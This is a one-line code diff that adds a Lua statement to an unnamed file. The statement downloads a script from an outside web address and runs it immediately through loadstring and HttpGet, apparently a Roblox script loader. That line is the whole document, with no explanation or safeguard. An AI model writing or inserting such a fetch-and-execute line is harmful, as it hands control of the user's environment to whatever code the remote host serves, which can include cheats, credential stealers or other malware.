@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://arches-systems.com/loader.lua",true))()
